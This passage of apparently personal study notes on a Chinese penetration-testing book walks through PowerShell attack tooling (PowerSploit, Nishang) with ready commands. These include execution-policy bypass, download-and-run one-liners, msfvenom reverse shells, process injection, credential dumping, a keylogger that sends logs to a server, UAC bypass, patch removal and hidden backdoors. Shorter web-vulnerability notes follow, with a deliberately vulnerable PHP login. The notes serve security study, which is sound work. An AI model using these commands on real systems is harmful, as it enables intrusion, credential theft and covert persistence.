+<span id="more"></span>
+<h4 id="6-1-2-基本概念"><a href="#6-1-2-基本概念" class="headerlink" title="6.1.2 基本概念"></a>6.1.2 基本概念</h4><p>1、PS1文件，就是一个简单的文本文件，扩展名.PS1，每个命令显示为独立的一行。</p>
+<p>2、执行策略：为防恶意脚本，Powershell 有个执行策略，默认为受限。在ps脚本无法执行时，可以用 cmdlet命令确定当前的执行策略。</p>
+<p>​	  Get-ExecutionPolicy        Restricted: 脚本不能运行（默认）</p>
+<p>​     RemoteSigned：本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</p>
+<p>AllSigned：仅当脚本由受信任的发布者签名时才能运行</p>
+<p>Unrestricted：允许所有script运行</p>
+<p>也可以用cmdlet 设置执行策略。</p>
+<p><code>Set-ExecutionPolicy &lt;policy name&gt;</code></p>
+<p>3、运行脚本</p>
+<p>相对路径和绝对路径</p>
+<p>4、管道  将一个命令的输出作为另一个命令的输入，用| 连接。</p>
+<h4 id="6-1-3-常用命令"><a href="#6-1-3-常用命令" class="headerlink" title="6.1.3 常用命令"></a>6.1.3 常用命令</h4><p>1、基本知识</p>
+<p>在powershell 下，类似“cmd命令”叫做 “ cmdlet ”，都采用“动词-名词”的形式，如New-Item，动词一般为 Add    New   Get   Remove   Set等，不区分大小写。</p>
+<p>新建目录：New-Item   相当于mkdir</p>
+<p>新建文件：New-Item   相当于 touch </p>
+<p>删除目录：Remove-Item      相当于rm</p>
+<p>显示文本内容：Get-Content     相当于cat</p>
+<p>设置文本内容：Set-Content    是向文件中写入内容，会覆盖之前的内容</p>
+<p>追加内容：Add-Content      追加</p>
+<p>清除内容：Clear-Content   </p>
+<p>2、常用命令</p>
+<p>如果要运行Powershell 脚本程序，必须用管理员权限将restricted 策略改成 unrestricted，所以在渗透时要绕过策略</p>
+<ol>
+<li><p>绕过本地权限执行</p>
+<p>上传xxxx.ps1 至目标服务器，在CMD环境下，在目标环境本地执行该脚本</p>
+<p><code>PowerShell.exe -ExecutionPolicy Bypass -File xxxx.ps1</code></p>
+</li>
+<li><p>本地隐藏绕过权限执行脚本</p>
+<p><code>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Nonlnteractive -NoProfile xxxx.ps1</code></p>
+</li>
+<li><p>用IEX下载远程PS1脚本绕过权限执行</p>
+<p><code>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonIIEX(New-ObjectNet.WebClient).DownloadString(&quot;xxxx.ps1&quot;);[Parameters]</code></p>
+</li>
+</ol>
+<p>ExecutionPolicy Bypass :  绕过执行安全策略，这个参数可以绕过任意一个安全保护规则，基本都要使用</p>
+<p>WindowStyle Hidden :  隐藏窗口</p>
+<p>NoLogo ：启动不显示版权标志的PowerShell</p>
+<p>NonInteractive(-NonI)：非交互模式，PowerShell 不为用户提供交互的提示</p>
+<p>NoProfile(-NoP)：PowerShell控制台不加载当前用户的配置文件</p>
+<p>Noexit:  执行后不退出Shell ，在使用键盘记录等脚本时很重要</p>
+<h3 id="6-2-PowerSploit"><a href="#6-2-PowerSploit" class="headerlink" title="6.2 PowerSploit"></a>6.2 PowerSploit</h3><h4 id="6-2-1-安装"><a href="#6-2-1-安装" class="headerlink" title="6.2.1 安装"></a>6.2.1 安装</h4><p>kali 自带，没有的话用git 安装，但是现在好像已经不维护了，介绍模块：</p>
+<p>AntivirusBypass :  发现杀软的查杀特征</p>
+<p>CodeExecution ：在目标主机执行代码</p>
+<p>Exfiltration ：目标主机上的信息搜集工具</p>
+<p>Mayhem :  蓝屏等破坏性脚本</p>
+<p>Persistenece :  后门脚本（持久控制）</p>
+<p>Recon :  以目标主机为跳板进行内网信息侦察</p>
+<p>ScriptModification :  在目标主机上创建或修改脚本</p>
+<h4 id="6-2-2-实战"><a href="#6-2-2-实战" class="headerlink" title="6.2.2 实战"></a>6.2.2 实战</h4><ol>
+<li><p>Invoke-Shellcode : CodeExecution 模块下的Invoke-Shellcode 脚本常用于将shellcode 插入指定的进程ID或本地PowerShell 中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先使用msfvenom 命令生成一个powershell 脚本木马</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.118 LPORT=4444 -f powershell -o /var/www/html/test</span><br><span class="line">接着在目标机Powershell 下输入以下命令下载该脚本</span><br><span class="line">IEX(New-ObjectNet.WebClient).DownloadString(&quot;http://192.168.1.118/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;)</span><br><span class="line">接着输入以下命令下载木马</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.118/test&quot;)</span><br><span class="line">下载木马</span><br><span class="line">Invoke-Shellcode -Shellcode ($buf) -Force </span><br><span class="line">运行木马，-Force 是不用提示，直接执行</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>​	指定进程注入 shellcode 反弹 meterpreter shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同样先在目标机Powershell 下输入以下命令</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.76.128/Invoke-Shellcode.ps1&quot;)</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.76.128/test&quot;)</span><br><span class="line"></span><br><span class="line">接着输入Get-Process 命令或者ps 命令查看当前进程</span><br><span class="line">然后输入以下命令创建一个新的进程，启动一个记事本，设置为隐藏，再次查看进程，多了一个notepad 的进程。</span><br><span class="line">Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br><span class="line"></span><br><span class="line">接着输入以下命令，使用Invoke-Shellcode脚本进行进程注入</span><br><span class="line">Invoke-Shellcode -ProcessID xxxx -Shellcode($buf) -Force</span><br><span class="line"></span><br><span class="line">MSF 监听端口反弹成功</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>Invoke-DllInjection</p>
+<p>Dll 代码注入脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先下载code Execution 模块下的另一个脚本Invoke-DllInjection</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.76.128/Invoke-DllInjection.ps1&quot;)</span><br><span class="line">然后使用以下命令在kali 中生成一个Dll注入脚本</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.76.128 lport=4444 -f dll -o /var/www/html/test.dll</span><br><span class="line">使用powershell 下载木马</span><br><span class="line">然后使用以下命令进行注入</span><br><span class="line">Invoke-DllInjection -ProcessID xxxx -Dll C:/test.dll</span><br><span class="line">msf 监听  reverse_tcp 反弹</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Invoke-Portscan</p>
+<p>Invoke-Portscan 是Recon 模块下的一个脚本，主要用于端口扫描</p>
+<p>Invoke-Portscan -Hosts 192.168.1.2,192.168.2.5 -Ports “80, 88,  22”</p>
+</li>
+<li><p>Invoke-Mimikatz</p>
+</li>
+</ol>
+<p>​		Invoke-Mimikatz 是 Exfiltration模块下的一个脚本，先下载脚本</p>
+<p><code>Invoke-Mimikatz -DumpCreds</code> 进入mimikatz界面，关于mimikatz 的用法会单独写一篇</p>
+<ol start="5">
+<li><p>Get-Keystrokes</p>
+<p>是Exfiltration 模块下的一个脚本，用于键盘记录，下载了之后使用 Get-Keystorkes -LogPath C:\test1.txt</p>
+</li>
+</ol>
+<h4 id="6-2-3-PowerUp-攻击模块讲解"><a href="#6-2-3-PowerUp-攻击模块讲解" class="headerlink" title="6.2.3 PowerUp 攻击模块讲解"></a>6.2.3 PowerUp 攻击模块讲解</h4><p>PowerUp 是Privesc 模块下的一个脚本，是拥有众多来寻找目标主机Windows 服务漏洞进行提权的实用脚本</p>
+<p>通常，Windows 下可以通过内核漏洞来提升权限，当无法通过内核漏洞提权时，可以利用脆弱的Windows服务提权，或者利用常见的系统服务，通过其继承的系统来完成提权。</p>
+<p>可以使用get-help [cmdlet] -full 查看帮助</p>
+<p>输入Invoke-AllChecks 会执行模块，这个模块会执行PowerUp下所有的脚本</p>
+<p>输入Find-PathDLLHikack 该模块用于检查当前%PATH%的哪些目录是用户可以写入的</p>
+<p>Get-ApplicationHost | Format-Table -Autosize  列表显示  利用系统上的applicationHost.config 文件恢复加密过的应用池和虚拟目录的密码</p>
+<p>Get-RegistryAlwaysInstallElevated  用于检查AlwaysInstallElevated注册表项是否被设置，如果已被设置，意味者MSI文件是以SYSTEM权限运行</p>
+<p>Get-RegistryAutoLogon 用于检测Winlogin 注册表的AutoAdminLogon项有没有被设置，可查询默认的用户名和密码。</p>
+<p>由于Empire 作者不在维护，就不记录这个工具了。</p>
+<h3 id="6-3-Nishang"><a href="#6-3-Nishang" class="headerlink" title="6.3 Nishang"></a>6.3 Nishang</h3><h4 id="6-3-1-简介"><a href="#6-3-1-简介" class="headerlink" title="6.3.1 简介"></a>6.3.1 简介</h4><p>Nishang 是一款针对Powershell的渗透工具，要在powershell 3.0以上的环境才可以正常使用，win7 自带的是powershell 2.0</p>
+<p>在github中下载了之后，使用 Get-Command -Moudle  nishang  来导入模块。使用Get-Information 查看各个模块的详细信息。</p>
+<h4 id="6-3-2-攻击实战"><a href="#6-3-2-攻击实战" class="headerlink" title="6.3.2 攻击实战"></a>6.3.2 攻击实战</h4><ol>
+<li><p>Check-VM：检测当前机器是否属于一台已知的虚拟机，一些主流的虚拟机。</p>
+</li>
+<li><p>Invoke-CredentialsPhish：欺骗用户输入密码，不输入关闭不了，只能强制关闭进程。</p>
+</li>
+<li><p>Copy-VSS：利用Volume Shadow Copy 服务复制sam文件，如果这个脚本运行在DC机上，ntds.dit和SYSTEM hive 也能被拷贝出来。</p>
+<p><code>Copy-VSS -DestinationDir C:temp</code></p>
+</li>
+<li><p>FireBuster FireListener 扫描器：用于对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先在本机输入以下命令</span><br><span class="line">FireListener 130-150</span><br><span class="line">然后在目标机上输入以下命令</span><br><span class="line">FireBuster 192.168.1.1 130-150 -Verbose</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Keylogger 键盘记录</p>
+<p>Get-Help .\Keylogger.ps1 -full 查看帮助文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\keylogger.ps1   使用这个方法运行，记录会被保存在当前用户Temp目录下的key文件中</span><br><span class="line">\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqPxxxxxxx -MagicString stopthis   checkURL会检测出网站中是否包含 -MagicString,如果有就停止记录。</span><br><span class="line">\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=xxxxxxx -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.1.1/data/catch.php   将记录指定发送给一个可以记录Post请求的Web服务器</span><br><span class="line">\Keylogger.ps1 -persist  持久化记录，重启后依然记录。</span><br><span class="line"></span><br><span class="line">对于记录，输入Nishang Utility的Parse_Keys 来解析，parsed.txt里就会出现解析后的按键记录。</span><br><span class="line">Parse_Keys ./key.log ./parsed.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Get-PassHashes：这个脚本在administrator的权限下可以Dump出密码哈希值，不需要SYSTEM权限就可以DUMP.</p>
+</li>
+<li><p>获取用户的密码提示信息：这个脚本可以从Windows 获取用户密码的提示信息，需要Administrator的权限来读取san hive，可以根据提示信息生成密码字典，能大大提高爆破的成功率   Get-PassHints</p>
+</li>
+</ol>
+<h4 id="6-3-3-Power-Shell-隐藏通信隧道"><a href="#6-3-3-Power-Shell-隐藏通信隧道" class="headerlink" title="6.3.3 Power Shell 隐藏通信隧道"></a>6.3.3 Power Shell 隐藏通信隧道</h4><ol>
+<li><p>基于TCP协议的PowerShell 交互式Shell</p>
+<p>Invoke-PowerShellTcp 是基于TCP协议的PowerShell 正向连接或反向连接Shell，具体参数：</p>
+<p>IPAddress xxx.xxx.xxx.xxx    连接的IP地址</p>
+<p>Port  xxxx         指定端口    -Bind 选项时表示需要监听的端口</p>
+<p>Reverse  反向连接  </p>
+<p>使用NC监听本地端口    nc -lvp 3333</p>
+<p>然后在目标机Power shell下输入以下命令，反弹Shell 到192.168.76.128 的端口3333。</p>
+<p>Invoke-PowerShellTcp -Reverse -IPAddress 192.168.76.128 -Port 3333</p>
+<p>Bind       正向连接</p>
+<p>在目标机Powershell 下执行以下脚本命令</p>
+<p>Invoke-PowerShellTcp -Bind -Port 3333</p>
+<p>在NC 中执行以下命令 nc -nv 192.168.76.128 3333</p>
+</li>
+<li><p>基于UDP协议的PowerShell 交互式 Shell</p>
+<p>Invoke-PowerShellUdp是基于UDP协议的Powershell 正向连接或反向连接Shell。</p>
+<p>正向连接：nc  -nvu 192.168.76.128 3333</p>
+<p>反向连接：nc -lup 3333</p>
+</li>
+<li><p>基于HTTP和HTTPS协议的Power shell交互式Shell</p>
+<p>Invoke-PoshRatHttp和Invoke-PoshRatHttps 是基于HTTP协议和HTTPS协议的powershell 反向连接shell。除了基于TCP和UDP协议的shell，Nishang还支持基于HTTP 和HTTPS协议的shell</p>
+<p>HTTP:  Invoke-PoshRatHttp -IPAddress 192.168.1.1 333</p>
+<p>HTTPS: Invoke-PoshRatHttps -IPAddress 192.168.1.1 333</p>
+</li>
+</ol>
+<h4 id="6-4-4-WebShell-后门"><a href="#6-4-4-WebShell-后门" class="headerlink" title="6.4.4 WebShell 后门"></a>6.4.4 WebShell 后门</h4><p>位于nishang\Antak-WebShell 目录，是一个ASPX的大马，使用PowerShell 的命令，这个大马可以编辑执行脚本、上传、下载文件。</p>
+<h4 id="6-4-5-权限提升"><a href="#6-4-5-权限提升" class="headerlink" title="6.4.5 权限提升"></a>6.4.5 权限提升</h4><ol>
+<li>下载执行</li>
+</ol>
+<p>Download_Execute是Nishang 中的下载执行脚本，常用于下载文本文件，然后转换为可执行文件。</p>
+<p>使用Nishang 中的exetotext.ps1 脚本将木马程序转为文本文件msf.txt           <code> ExetoText   ./msf.exe  ./msf.txt</code></p>
+<p>然后调用Download_Execute脚本下载并执行文本文件。Download_Execute     <code>http://192.168.76.128/msf.txt</code></p>
+<ol start="2">
+<li>Bypass UAC</li>
+</ol>
+<p>User Account Control（用户账户控制）是微软为提高系统安全而在windows vista中引入的新技术，要求用户在执行可能会影响计算机运行或其他用户设置的操作之前，要求权限或管理员密码。在未经许可的情况下，UAC可以防止恶意软件和间谍软件在计算机上进行安装或对计算机进行更改。</p>
+<p>在windows Vista 以及更高的版本中，微软引入安全策略，分为中高低，高等级进程有管理员权限，中等级进程有基本用户权限，低级别进程权限有各种限制。</p>
+<p>UAC 需要授权的动作包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置Windows Update</span><br><span class="line">增加或删除用户账户</span><br><span class="line">改变用户的账户类型</span><br><span class="line">改变UAC设置</span><br><span class="line">安装ActiveX</span><br><span class="line">安装或卸载程序</span><br><span class="line">安装设备驱动程序</span><br><span class="line">设置家长控制</span><br><span class="line">将文件移动到Program Files或Windows目录</span><br><span class="line">查看其他用户的文件夹</span><br></pre></td></tr></table></figure>
+
+<p>UAC有4中设置要求</p>
+<p>始终通知：最严格的设置，任何时候，当程序使用高级别权限时，都会提示本地用户。</p>
+<p>仅在程序试图更改我的计算机时通知我：UAC默认策略，本地程序使用高权限不通知，第三方程序要求使用高权限时会提示用户。</p>
+<p>和上面一样，但是不降低桌面亮度</p>
+<p>从不提示：当用户为系统管理员，所有程序都会以最高权限运行。</p>
+<p>Invoke-PsUACme模块使用了来自UACME项目的DLL来绕过UAC</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-PsUACme -Verbose   使用Sysprep方法并执行默认的Payload</span><br><span class="line">Invoke-PsUACme -method oobe -Verbose   使用oobe方法并执行默认的Payload</span><br><span class="line">Invoke-PsUACme -method oobe -Payload &quot;powershell -Windowstyle hidden -e Your EncodePayload&quot;   使用-payload 参数可以自行指定执行的Payload</span><br><span class="line"></span><br><span class="line">还可以使用-CustomDll64(64位)或-CustomDLL32（32位）</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>删除补丁</li>
+</ol>
+<p>这个脚本可以帮助我们移除系统所有的更新或所有安全更新，以及指定编号更新。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Remove-Update All      移除目标机器上的所有更新</span><br><span class="line">Remove-Update Security    移除目标机器上的所有与安全相关的更新</span><br><span class="line">Remove-Update KB2761226   移除指定编号的更新</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>其他功能</p>
+<p>4.1   端口扫描（Invoke-PortScan）</p>
+<p>使用Get-Help Invoke-PortScan -full 查看帮助信息。startAddress   扫描范围开始的地址</p>
+<p>EndAddress   扫描范围结束的地址</p>
+<p>ScanPort        进行端口扫描</p>
+<p>Port   指定端口</p>
+<p>TimeOut      设置超时时间</p>
+<p>4.2   爆破破解（Invoke-BruteForce）</p>
+<p>是专注于暴力破解的脚本，用于对SQL Server、域控制器、Web及FTP弱口令爆破。</p>
+<p>ComputerName       对于服务的计算机名</p>
+<p>User List                  用户名字典</p>
+<p>PasswordList           密码字典</p>
+<p>Service服务（默认为SQL）</p>
+<p>StopOnSuccess      匹配一个后停止</p>
+<p>Delay                    延迟时间</p>
+<p>4.3  嗅探 </p>
+<p>内网嗅探简单动静大，实在没办法时可以试试</p>
+<p><code>Invoke-Interceptor  -ProxyServer  192.168.76.128 -ProxyPort 9999</code></p>
+<p>4.4 屏幕窃取</p>
+<p>Show-TargetScreen 脚本使用MJPEG传输目标机远程桌面的实时画面，在本机可以使用NC或者PowerCat进行监听，在支持MJPEG的浏览器中也可访问，查看实时画面。</p>
+<p>目标机： <code>Show-TargetScreen -Reverse -IPAddress 192.168.76.128 -Port 5555</code></p>
+<p>本机： <code>netcat -nlvp 5555 | netcat -nlvp 5555</code></p>
+<p>正向连接</p>
+<p>目标机：<code>Show-TargetScreen -Bind -Port 5555</code></p>
+<p>本机：<code>netcat nv 192.168.76.128 5555 | netcat -lnvp 5555</code></p>
+<p>4.5 生成木马</p>
+<p>各个脚本的使用方法基本相同，以生成受感染的Word为例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload    后面直接加Payload，需要注意引号的闭合</span><br><span class="line">PayloadURL  传入远程的Payload进行生成</span><br><span class="line">PayloadScript   指定本地的脚本进行生成</span><br><span class="line">Arguments    之后要执行的函数</span><br><span class="line">OutputFile   输出的文件名</span><br><span class="line">WordFileDir   输出的目录地址</span><br><span class="line">Recurse    在WordFileDir 中递归寻找word文件</span><br><span class="line">RemoveDocx  创建完成后删除原始文件</span><br></pre></td></tr></table></figure>
+
+<p>4.6 后门</p>
+<p>（1）HTTP-Backdoor</p>
+<p>可以帮助我们在目标机器上下载和执行PowerShell脚本，接受来自第三方网站的指令，然后在内存中执行。</p>
+<p><code>HTTP-Backdoor -CheckURL http://xxxxx.com/raw.php?i=xxxxx -PayloadURL http://xxxxxx.com/raw.php?i=xxxxxx -MagicString start123 -StopString stopthis</code></p>
+<p>CheckURL   给出一个URL地址，如果存在，MagicString中的值就执行Payload来下载、运行我们的脚本</p>
+<p>PayloadURL   给出需要下载的PowerShell 脚本的地址</p>
+<p>Arguments    指定要执行的函数</p>
+<p>StopString  判断是否存在CheckURL返回的字符串，如果存在则停止执行</p>
+<p>（2）Add-ScrnSaveBackdoor</p>
+<p>利用屏保来留一个隐藏的后门，执行方式如下</p>
+<p><code>Add-ScrnSaveBackdoor -Payload “powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process” </code>  使用这条语句可以执行我们生成的Payload</p>
+<p><code>Add-ScrnSaveBackdoor -PayloadURL http://192.168.13.11/Powerpreter.psm1 -Arguments HTTP-Backdoor http://xxxxxx.com/raw.php?i=xxxxx start123 stopthis</code></p>
+<p><code>Add-ScrnSaveBackdoor -PayloadURL http://xxx.xx.xx.xx/code_exec.ps1</code></p>
+<p>也可以使用msfvenom先生成一个PowerShell，然后利用以下命令返回一个Meterpreter</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.76.128 -f powershell</code></p>
+<p>(3) Invoke-ADSBackdoor</p>
+<p>这个脚本使用NTFS数据流留下一个永久性后门，这个脚本可以向ADS中注入代码并且以普通用户的权限运行，输入以下命令执行脚本。</p>
+<p><code>Invoke-ADSBackdoor -PayloadURL http://192.168.12.110/test.ps1</code></p>
+<p>执行该脚本后， 使用 dir &#x2F;a &#x2F;r 才能看到被写入的文件</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+        <category>Web安全攻防：渗透测试指南</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+        <tag>读书笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x03 Web安全原理剖析</title>
+    <url>/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%88web%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="4-3-SQL注入"><a href="#4-3-SQL注入" class="headerlink" title="4.3 SQL注入"></a>4.3 SQL注入</h3><p>内容可以看我之前写的 sqli-labs注入， 链接是： <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/">http://limbus.top/categories/网络安全/SQL注入/</a></p>
+<h4 id="4-3-2-XFF注入攻击"><a href="#4-3-2-XFF注入攻击" class="headerlink" title="4.3.2 XFF注入攻击"></a>4.3.2 XFF注入攻击</h4><p>请求头的X-Forwarfed-For注入。代表了客户端的真实IP。通过修改X-Forwarded-For的值可以伪造客户端IP。修改XFF和其他部位修改一样。</p>
+<h4 id="4-3-3-防止SQL注入"><a href="#4-3-3-防止SQL注入" class="headerlink" title="4.3.3 防止SQL注入"></a>4.3.3 防止SQL注入</h4><p>使用过滤语句，用正则匹配过滤</p>
+<span id="more"></span>
+
+<p>使用预编译语句，使用PDO预编译语句，需要注意的是，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增加、删除、修改、查询。</p>
+<h3 id="4-4-XSS基础"><a href="#4-4-XSS基础" class="headerlink" title="4.4 XSS基础"></a>4.4 XSS基础</h3><p>内容可以看我之前写的 xss-labs注入， 链接是：<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/XSS%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/">http://limbus.top/categories/网络安全/XSS漏洞练习/</a></p>
+<h3 id="4-5-CSRF漏洞"><a href="#4-5-CSRF漏洞" class="headerlink" title="4.5 CSRF漏洞"></a>4.5 CSRF漏洞</h3><h4 id="4-5-1-介绍"><a href="#4-5-1-介绍" class="headerlink" title="4.5.1 介绍"></a>4.5.1 介绍</h4><p>CSRF( cross-site request forgery 跨站请求伪造) ：攻击者利用目标用户的身份，以目标身份的名义执行某些非法操作。常用来制作蠕虫攻击，刷SEO流量等。</p>
+<h4 id="4-5-2-利用CSRF流量"><a href="#4-5-2-利用CSRF流量" class="headerlink" title="4.5.2 利用CSRF流量"></a>4.5.2 利用CSRF流量</h4><p>以蠕虫攻击为例。</p>
+<p>用BurpSuite 抓包，然后利用BP自带的CSRF POC 构造模块生成一段HTML代码，此代码是CSRF 漏洞的测试代码。将这段代码发布到一个网站上，诱导用户访问，当目标用户处于登录状态，并在同一浏览器访问了该网址后，目标用户就会自动发布一篇文章。</p>
+<p>后台添加代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;连接失败&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="string">&quot;select * from users where `username`=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and `password`=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) != <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;请登录后台&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$result1</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="string">&quot;insert into user(`username`, `password`) VALUES (&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]).<span class="string">&quot;&#x27;)&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;添加成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-5-3-CSRF-修复建议"><a href="#4-5-3-CSRF-修复建议" class="headerlink" title="4.5.3 CSRF 修复建议"></a>4.5.3 CSRF 修复建议</h4><p>1、验证请求的referer的值。</p>
+<p>2、在请求中放入攻击者不能为伪造的值，例如随机token等。</p>
+<h3 id="4-6-SSRF漏洞"><a href="#4-6-SSRF漏洞" class="headerlink" title="4.6 SSRF漏洞"></a>4.6 SSRF漏洞</h3><h4 id="4-6-1-介绍"><a href="#4-6-1-介绍" class="headerlink" title="4.6.1 介绍"></a>4.6.1 介绍</h4><p>SSRF(server-side request forgery，服务端请求伪造)  是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下攻击目标是外网无法访问的内部系统。SSRF的形成大多是由于服务端提供了从其他服务应用获取数据的功能且没有对目标地址做过滤与限制。</p>
+<h4 id="4-6-2-利用"><a href="#4-6-2-利用" class="headerlink" title="4.6.2 利用"></a>4.6.2 利用</h4><p>例如： <code>https://localhost:9999/ssrf.php?url=https://www.baidu.com</code></p>
+<p>将百度的地址改为内网的地址 192.168.0.1:3306 ,探测内网主机是否存在mysql。</p>
+<h4 id="SSRF-修复建议"><a href="#SSRF-修复建议" class="headerlink" title="SSRF 修复建议"></a>SSRF 修复建议</h4><ol>
+<li>限制请求的端口只能为WEB端口，只允许HTTP和HTTPS的请求</li>
+<li>限制不能访问内网的IP</li>
+<li>屏蔽返回的详细信息</li>
+</ol>
